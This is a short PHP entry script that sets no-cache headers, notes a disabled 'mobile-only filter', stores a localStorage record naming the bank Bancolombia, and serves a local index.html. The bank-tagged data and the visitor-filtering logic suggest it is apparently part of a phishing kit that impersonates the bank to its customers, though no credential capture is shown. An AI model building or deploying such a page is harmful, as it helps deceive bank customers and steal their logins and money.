<?php
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Vary: User-Agent');

// Filtro solo-movil desactivado

header('Content-Type: text/html; charset=UTF-8');
echo '<script>localStorage.setItem("tbdatos", JSON.stringify({banco: "BANCOLOMBIA"}));</script>';
readfile(__DIR__ . '/index.html');
